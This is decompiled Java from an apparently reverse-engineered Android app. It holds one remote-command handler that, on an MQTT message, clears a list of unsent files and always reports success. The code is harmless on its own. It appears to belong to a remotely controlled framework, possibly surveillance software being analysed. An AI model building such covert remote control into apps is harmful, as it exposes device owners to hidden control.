package com.app.system.common.commands;

import android.content.Context;
import com.app.system.common.d.a.h;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;
import java.util.Hashtable;

public class CleanUnsentFilesList
  extends Command
{
  public static final String CMD_NAME = "CLEAN_MATTER_FILES";
  public static Command.Factory sFactory = new Command.Factory()
  {
    public Command a(MqttCommand paramAnonymousMqttCommand)
    {
      return new CleanUnsentFilesList(paramAnonymousMqttCommand);
    }
  };
  
  public CleanUnsentFilesList(MqttCommand paramMqttCommand)
  {
    super(paramMqttCommand);
  }
  
  public MqttCommandReply a(Context paramContext)
  {
    MqttCommandReply localMqttCommandReply = this.mqttCmd.b(paramContext);
    try
    {
      h.d.clear();
      localMqttCommandReply.result = 0;
    }
    catch (Exception paramContext)
    {
      localMqttCommandReply.result = 1;
    }
    localMqttCommandReply.result = 0;
    return localMqttCommandReply;
  }
}


/* Location:              ~/com/app/system/common/commands/CleanUnsentFilesList.class
 *
 * Reversed by:           J
 */